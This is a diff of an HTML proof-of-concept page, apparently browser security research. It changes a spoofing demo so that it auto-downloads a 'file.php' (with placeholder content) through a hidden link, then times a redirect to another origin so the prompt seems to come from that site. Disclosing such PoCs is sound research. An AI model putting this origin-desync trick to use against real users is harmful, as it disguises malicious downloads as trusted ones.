@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>File Picker Spoofing with Origin Desync PoC</title>
+<title>Origin Desync Login PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -37,7 +37,7 @@ h2 { text-align:center; margin-bottom:6px; }
   color:#b00020;
 }
 
-.save-file-button {
+.download-button {
   margin-top:20px;
   width:100%;
   padding:12px;
@@ -58,12 +58,12 @@ h2 { text-align:center; margin-bottom:6px; }
 
 <div id="panel">
   <h2>Download File</h2>
-  <div class="sub">Click below to trigger file picker</div>
+  <div class="sub">Click below to download file.php</div>
 
-  <button class="save-file-button" onclick="triggerSaveFilePicker()">Download File (file.php)</button>
+  <button class="download-button" onclick="downloadFile()">Download File (file.php)</button>
 
   <div class="notice">
-    Demo only — file picker is simulated, no data is saved.
+    Demo only — file is being generated as `file.php`.
   </div>
 </div>
 
@@ -71,28 +71,19 @@ h2 { text-align:center; margin-bottom:6px; }
 const panel = document.getElementById('panel');
 const trigger = document.getElementById('trigger');
 
-// Trigger File Picker to download file.php
-async function triggerSaveFilePicker() {
-  if ('showSaveFilePicker' in window) {
-    try {
-      const handle = await window.showSaveFilePicker({
-        suggestedName: 'file.php', // The suggested filename for the file
-        types: [{
-          description: 'PHP Files',
-          accept: {'text/plain': ['.php']}, // Accept PHP file type
-        }],
-      });
-
-      const writable = await handle.createWritable();
-      const phpContent = `<?php echo 'This is a malicious PHP file!'; ?>`; // Simulated PHP content
-      await writable.write(phpContent); // Writing PHP content to the file
-      await writable.close(); // Closing the writable stream
-    } catch (err) {
-      console.error('Error opening file picker:', err);
-    }
-  } else {
-    alert('This browser does not support the file picker API.');
-  }
+// Function to trigger the download of file.php
+function downloadFile() {
+  const fileContent = `<?php echo 'This is a malicious PHP file!'; ?>`; // Malicious PHP code content
+  const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+  const fileUrl = URL.createObjectURL(fileBlob);
+  
+  // Create an invisible anchor tag to trigger the download
+  const downloadLink = document.createElement('a');
+  downloadLink.href = fileUrl;
+  downloadLink.download = 'file.php'; // Filename for download
+  document.body.appendChild(downloadLink);
+  downloadLink.click(); // Trigger the download
+  document.body.removeChild(downloadLink); // Clean up
 }
 
 trigger.onclick = () => {
@@ -106,7 +97,7 @@ window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
       setTimeout(() => {
-        location.href = 'http://google.com:8080'; // Malicious URL to simulate context change
+        location.href = 'http://google.com:9090'; // Malicious URL to simulate context change
       }, 80);
     });
   });
